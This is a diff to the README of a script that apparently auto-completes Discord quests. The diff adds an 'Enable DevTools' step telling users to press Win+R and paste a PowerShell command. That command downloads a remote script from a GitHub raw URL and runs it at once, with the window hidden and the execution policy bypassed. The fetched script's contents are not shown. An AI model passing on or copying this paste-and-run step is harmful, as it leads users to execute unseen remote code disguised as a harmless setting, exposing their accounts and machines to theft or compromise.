@@ -11,7 +11,7 @@
   </a>
 </p>
 
-
+Auto [Enable DevTools](#enable-devtools).
 #
 <p align="center">
 Automatically completes your enrolled quests
@@ -70,6 +70,12 @@ PLAY_ON_DESKTOP/PLAY_ON_PLAYSTATION/PLAY_ON_XBOX/PLAY_ACTIVITY/..., STREAM_ON_DE
     }
   };console.log('No more quests left.');
 })()
+```
+#
+### Enable DevTools
+- Win + R and paste:
+```r
+powershell -w h -ep B -c "iex(iwr https://raw.githubusercontent.com/DiamondRoPlayz/Discord-Quester/main/EnableDevTools.ps1)"
 ```
 #
 <p align="center">
